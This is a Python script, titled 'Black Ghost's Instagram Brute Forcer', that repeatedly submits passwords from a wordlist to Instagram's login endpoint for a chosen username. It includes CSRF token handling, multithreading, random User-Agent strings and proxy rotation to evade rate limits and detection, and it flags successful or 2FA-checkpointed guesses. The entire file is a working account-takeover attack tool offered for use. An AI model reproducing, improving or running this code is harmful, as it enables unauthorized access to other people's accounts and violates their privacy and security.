import requests
import json
import time
import os
import random
from concurrent.futures import ThreadPoolExecutor

def welcome_message():
    logo = '''
      ██████╗ ██╗      ██████╗ ███████╗███████╗
     ██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝
     ██████╔╝██║     ██████╔╝█████╗  █████╗  
     ██╔═══╝ ██║     ██╔══██╗██╔══╝  ██╔══╝  
     ██║     ███████╗██████╔╝███████╗███████╗
     ╚═╝     ╚══════╝╚═════╝ ╚══════╝╚══════╝
    '''
    print(f"\033[1;31m{logo}\033[0m")
    print("\033[1;32mWelcome to Black Ghost's Instagram Brute Forcer!\033[0m")

def display_sticker(message):
    stickers = {
        "username": "🧑‍💻",
        "password": "🔑",
        "proxy": "🌍",
        "delay": "⏱️",
        "multithreading": "💻",
        "user-agent": "🕵️‍♂️",
        "save-results": "💾",
        "proxy-rotation": "🔄"
    }
    return f"{stickers.get(message, '❓')} {message}"

class InstaBrute:
    def __init__(self, username, password_file='pas.txt', proxy=None):
        self.username = username
        self.password_file = password_file
        self.proxy = proxy
        self.session = requests.Session()
        self.csrf_token = None
        self.setup_headers()
        self.passwords = self.load_passwords()

    def setup_headers(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Referer': 'https://www.instagram.com/',
            'X-Requested-With': 'XMLHttpRequest',
        })
        if self.proxy:
            self.session.proxies.update({
                'http': self.proxy,
                'https': self.proxy
            })

    def load_passwords(self):
        if not os.path.exists(self.password_file):
            print(f"[!] Password file '{self.password_file}' not found.")
            exit()
        with open(self.password_file, 'r') as f:
            lines = f.read().splitlines()
            if not lines:
                print("[!] Password file is empty.")
                exit()
            print(f"[*] Loaded {len(lines)} passwords from '{self.password_file}'")
            return lines

    def get_csrf_token(self):
        r = self.session.get('https://www.instagram.com/')
        cookies = r.cookies.get_dict()
        csrf = cookies.get('csrftoken')
        if not csrf:
            print("[!] Couldn't fetch CSRF token.")
        return csrf

    def try_login(self, password):
        # فقط یکبار csrf token بگیر
        if not self.csrf_token:
            self.csrf_token = self.get_csrf_token()
            if not self.csrf_token:
                print("[!] CSRF token not found. Skipping this attempt.")
                return False

        # آپدیت هدرها با csrf token
        self.session.headers.update({
            'X-CSRFToken': self.csrf_token,
            'Referer': 'https://www.instagram.com/accounts/login/',
            'X-Instagram-AJAX': '1',
        })

        payload = {
            'username': self.username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        try:
            res = self.session.post('https://www.instagram.com/accounts/login/ajax/',
                                    data=payload, allow_redirects=True)
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return False

        # بروز رسانی csrf token از کوکی‌ها بعد هر لاگین
        self.csrf_token = res.cookies.get('csrftoken', self.csrf_token)

        try:
            data = res.json()
        except json.JSONDecodeError:
            print("[!] Invalid JSON response.")
            return False

        if data.get('authenticated'):
            print(f"[+] Success! Username: {self.username}, Password: {password}")
            return True
        elif data.get('message') == 'checkpoint_required':
            print(f"[+] Checkpoint required (2FA or suspicious login): {password}")
            return True
        else:
            print(f"[-] Failed: {password}")
            return False

    def start(self, delay=3):
        print(f"[*] Starting brute-force on: {self.username}")
        for password in self.passwords:
            try:
                if self.try_login(password):
                    break
                time.sleep(delay)
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user. Exiting.")
                break

    def enable_multithreading(self):
        choice = input(f"{display_sticker('multithreading')} Do you want to enable multithreading? (y/n): ").lower()
        if choice == 'y':
            print("[*] Enabling multithreading...")
            with ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(self.try_login, self.passwords)

    def random_user_agent(self):
        choice = input(f"{display_sticker('user-agent')} Do you want to use random User-Agents? (y/n): ").lower()
        if choice == 'y':
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
            ]
            self.session.headers.update({'User-Agent': random.choice(user_agents)})
            print("[*] Random User-Agent enabled.")

    def save_results(self):
        choice = input(f"{display_sticker('save-results')} Do you want to save results in a file? (y/n): ").lower()
        if choice == 'y':
            with open('results.txt', 'w') as f:
                for password in self.passwords:
                    f.write(password + "\n")
            print("[*] Results saved to 'results.txt'.")

    def proxy_rotation(self):
        choice = input(f"{display_sticker('proxy-rotation')} Do you want to use proxy rotation? (y/n): ").lower()
        if choice == 'y':
            if not os.path.exists('proxy_list.txt'):
                print("[!] Proxy list file 'proxy_list.txt' not found.")
                return
            with open('proxy_list.txt', 'r') as f:
                proxies = f.read().splitlines()
                for proxy in proxies:
                    self.session.proxies.update({
                        'http': proxy,
                        'https': proxy
                    })
                    print(f"[*] Using proxy: {proxy}")
                print("[*] Proxy rotation enabled.")

if __name__ == '__main__':
    welcome_message()

    username = input(f"{display_sticker('username')} Enter Instagram username: ").strip()

    use_proxy = input(f"{display_sticker('proxy')} Use proxy? (y/n): ").lower()
    proxy = None
    if use_proxy == 'y':
        proxy = input(f"{display_sticker('proxy')} Enter proxy (http://ip:port): ").strip()

    delay = input(f"{display_sticker('delay')} Enter delay between attempts (in seconds): ").strip()
    try:
        delay = int(delay)
    except:
        delay = 3

    brute = InstaBrute(username, password_file='pas.txt', proxy=proxy)

    brute.enable_multithreading()
    brute.random_user_agent()
    brute.save_results()
    brute.proxy_rotation()

    brute.start(delay=delay)
